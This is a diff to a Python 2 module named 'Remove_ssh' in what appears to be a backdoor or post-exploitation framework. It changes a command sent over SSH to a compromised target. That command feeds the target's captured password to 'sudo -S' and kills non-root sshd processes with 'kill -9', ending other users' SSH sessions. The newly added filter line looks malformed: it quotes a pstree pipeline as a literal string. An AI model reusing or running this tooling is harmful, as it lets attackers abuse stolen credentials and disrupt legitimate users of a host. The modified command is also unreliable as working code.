@@ -21,7 +21,7 @@ class Remove_ssh(Backdoor):
 	if self.get_value("server")==True:
             self.core.curtarget.ssh.exec_command(self.get_command())
 	if self.get_value("killall")==str(True) or self.get_value("killall")==str(1):
-	    newstr=str("echo " + self.core.curtarget.pword + " | sudo -S ps -ef | grep sshd | grep -v root | grep -v grep | awk \'{print \"kill -9\", $2}\' | sh")
+	    newstr=str("echo " + self.core.curtarget.pword + " | sudo -S ps -ef | grep sshd | grep -v root | grep -v \'{pstree -p | grep cut | cut -d\( -f3 | cut -d\) -f1}\' | grep -v grep | awk \'{print \"kill -9\", $2}\' | sh")
 	    print newstr
 	    self.core.curtarget.ssh.exec_command(newstr)
 	print(GOOD + "Ssh removed.")
